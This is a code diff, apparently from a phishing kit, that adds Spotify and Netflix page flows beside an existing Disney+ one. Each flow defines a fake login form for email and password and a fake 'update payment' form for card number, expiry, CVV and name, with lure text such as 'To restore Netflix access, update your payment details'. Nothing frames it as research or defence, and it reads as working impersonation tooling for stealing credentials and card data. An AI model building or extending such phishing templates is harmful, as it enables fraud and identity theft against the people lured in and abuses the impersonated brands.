@@ -720,6 +720,16 @@ FLOWS.disneyplus = [
   { slug:'payment-update', form_type:'payment',page_title:'Update Payment',     headline:'Update Payment Method',         subheadline:'Update your card details to continue watching Disney+', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'Update',    step_label:'Payment Update', notify_step:true  }
 ];
 
+FLOWS.spotify = [
+  { slug:'login',          form_type:'login',  page_title:'Spotify – Login',    headline:'Log in to Spotify',             subheadline:'',                               fields:['email','password'],                          layout:'auth',  cta:'Log In',    step_label:'Login',          notify_step:true  },
+  { slug:'payment-update', form_type:'payment',page_title:'Update Payment',     headline:'Update Payment Details',        subheadline:'Update your payment method to continue your Premium subscription', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'Update',    step_label:'Payment Update', notify_step:true  }
+];
+
+FLOWS.netflix = [
+  { slug:'login',          form_type:'login',  page_title:'Sign In – Netflix',  headline:'Sign in to Netflix',            subheadline:'Enter your email and password',  fields:['email','password'],                          layout:'auth',  cta:'Sign In',   step_label:'Login',          notify_step:true  },
+  { slug:'payment-update', form_type:'payment',page_title:'Update Billing',     headline:'Update Billing Details',        subheadline:'To restore Netflix access, update your payment details', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'Update',    step_label:'Payment Update', notify_step:true  }
+];
+
 // ── BRANDS array ─────────────────────────────────────────────────────────────
 
 const BRANDS = [
